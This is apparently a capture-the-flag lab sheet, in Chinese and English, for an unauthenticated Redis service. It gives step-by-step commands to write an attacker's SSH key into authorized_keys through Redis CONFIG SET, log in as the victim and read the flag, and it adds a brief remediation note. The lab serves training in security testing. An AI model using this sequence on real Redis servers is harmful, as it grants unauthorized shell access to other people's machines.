# DB-05: Redis Unauthorized Access

## 场景信息

| 字段 | 值 |
|---|---|
| ID | DB-05 |
| 名称 | Redis Unauthorized Access |
| 技术/CVE | N/A (misconfiguration) |
| 难度 | L1 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10205 |

## 场景概述
- 技术：N/A (misconfiguration)
- 难度：L1
- 交付方式：docker
- 入口端口：10205
## 攻击路径与利用步骤

| Property | Value |
|----------|-------|
| Technique | Redis RCE via SSH key |
| Difficulty | L1 |
| Redis Port | 10205 |
| SSH Port | 10222 |
| User | victim / password123 |

### Attack Path
```
Connect to Redis (no auth) → Write SSH key to ~/.ssh/authorized_keys → SSH as victim → /flag.txt
```

```bash
# Step 1: Generate SSH key pair on attacker
ssh-keygen -t rsa -f redis_key -N ""

# Step 2: Write public key to Redis
redis-cli -h localhost -p 10205
CONFIG SET dir /home/victim/.ssh
CONFIG SET dbfilename authorized_keys
SET key "$(cat redis_key.pub | tr -d '\n')"
SAVE

# Step 3: SSH as victim
ssh -i redis_key -p 10222 victim@localhost
cat /flag.txt
# flag{db-05-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Redis TCP service and redis-cli |
| 侦察与前置条件 | Unauthenticated Redis access and key/database enumeration |
| 核心漏洞与利用 | Connect without credentials and abuse exposed Redis commands |
| 权限、横向或影响 | Unauthorized data/configuration access |
| 验证 | Read the flag key or exposed file-derived value |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
